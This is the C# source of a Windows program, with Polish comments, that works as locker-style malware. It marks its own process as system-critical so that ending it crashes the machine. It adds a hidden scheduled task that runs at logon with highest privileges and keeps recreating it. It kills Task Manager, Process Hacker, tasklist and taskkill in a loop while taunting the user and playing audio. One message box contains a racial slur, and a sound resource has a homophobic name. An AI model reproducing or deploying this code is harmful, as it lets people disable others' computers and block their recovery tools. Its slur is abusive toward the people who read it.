using System;
using System.Diagnostics;
using System.Media;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace youCantLeavethis

{
    internal static class Program
    {
        /// <summary>
        /// Główny punkt wejścia dla aplikacji.
        /// </summary>
        [STAThread]
        static void Main()
        {
            player = new SoundPlayer(Properties.Resources.Mazurek_Dąbrowskiego);
            player.PlayLooping();

            Process.EnterDebugMode();

            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);

            check_if_running();
            new Thread(loop_kill).Start();
            startup();
            make_process_critical();
            new Thread(check_reg).Start();
            new Thread(check_process_status).Start();
            Application.Run(new youCantLeavethis());
        }

        private static SoundPlayer player;


        // importy bibliotek

        /* RtlSetProcessIsCritical
         * 
         * Parameters:
         * 
           The bNew argument is the desired new setting for whether the current process is critical.
           The pbOld argument provides the address of a variable that is to receive the old setting. This argument can be NULL to mean that the old setting is not wanted.
           The bNeedScb argument specifies whether to require that system critical breaks be already enabled for the current process.
         */

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int RtlSetProcessIsCritical(bool bNew, out bool pbOld, bool bNeedScb);

        /* IsProcessCritical
         * 
         * Parameters:
         * 
           hProcess [in] - A handle to the process to query. The process must have been opened with PROCESS_QUERY_LIMITED_INFORMATION access.
           Critical [out] - A pointer to the BOOL value this function will use to indicate whether the process is considered critical.
         */

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool IsProcessCritical(IntPtr hProcess, out bool IsCritical);

        public static void make_process_critical()
        {
            bool last_setting;
            RtlSetProcessIsCritical(true, out last_setting, false);
        }

        public static void make_process_not_critical()
        {
            bool last_setting;
            RtlSetProcessIsCritical(false, out last_setting, false);
        }

        public static bool check_if_critical_process()
        {
            Process process = Process.GetCurrentProcess();
            bool isCritical;
            IsProcessCritical(process.Handle, out isCritical);
            return isCritical;
        }

        public static void startup()
        {
            string taskName = "CET";
            string exePath = Application.ExecutablePath;

            // schtasks nie pyta o UAC jeśli już mamy admina
            ProcessStartInfo psi = new ProcessStartInfo
            {
                FileName = "schtasks",
                Arguments = $"/create /f /tn \"{taskName}\" /sc onlogon /rl highest /tr \"\\\"{exePath}\\\"\"",
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true
            };

            Process.Start(psi)?.WaitForExit();
        }

        public static void stop_startup()
        {
            string taskName = "CET";
            string exePath = Application.ExecutablePath;

            // schtasks nie pyta o UAC jeśli już mamy admina
            ProcessStartInfo psi = new ProcessStartInfo
            {
                FileName = "schtasks",
                Arguments = $"/delete /f /tn \"{taskName}\"",
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true
            };

            Process.Start(psi)?.WaitForExit();
        }

        private static bool task_exists()
        {
            ProcessStartInfo psi = new ProcessStartInfo
            {
                FileName = "schtasks",
                Arguments = "/query /tn \"CET\"",
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true,
                RedirectStandardOutput = true,
                UseShellExecute = false
            };

            Process p = Process.Start(psi);
            p.WaitForExit();
            return p.ExitCode == 0; // 0 = task istnieje, 1 = nie ma
        }

        static private void loop_kill()
        {
            while (true) {
                string[] to_kill = { "ProcessHacker", "taskmgr", "tasklist", "taskkill" };

                foreach (string process in to_kill)
                {
                    foreach (Process proc in Process.GetProcessesByName(process))
                    {
                        proc.Kill();
                        MessageBox.Show($"{process} really?? i expected more from you.", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                    }
                }
                Thread.Sleep(20);
            }
        }

        private static bool is_running_r = true;

        static private void check_reg()
        {
            while (is_running_r)
            {
                if (!task_exists())
                {
                    startup();
                    MessageBox.Show("Alright this is a good try but not good enough :(", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                }
                Thread.Sleep(200);
            }
        }

        static private void stop_checking_reg()
        {
            is_running_r = false;
        }

        private static bool is_running_p = true;

        static private void check_process_status()
        {
            while (is_running_p) {
                if (!check_if_critical_process())
                {
                    MessageBox.Show("Damn you're very very i mean VERY good but still i dont think you can beat me :P", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                    make_process_critical();
                }
                Thread.Sleep(200);
            }
        }

        private static void stop_checking_proc()
        {
            is_running_p = false;
        }

        private static void check_if_running()
        {
            int count = 0;

            foreach(Process process in Process.GetProcessesByName(Process.GetCurrentProcess().ProcessName))
            {
                if (count == 1)
                {
                    MessageBox.Show("Nigga its already running", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                    Process.GetCurrentProcess().Kill();
                }
                count++;
            }
        }

        static public void fix()
        {
            stop_checking_reg();
            stop_startup();
            stop_checking_proc();
            make_process_not_critical();

            player.Stop();
            player.Dispose();
            player = new SoundPlayer(Properties.Resources.Ha__Gay___QuickSounds_com);
            player.PlaySync();
            Process.GetCurrentProcess().Kill();
        }
    }
}
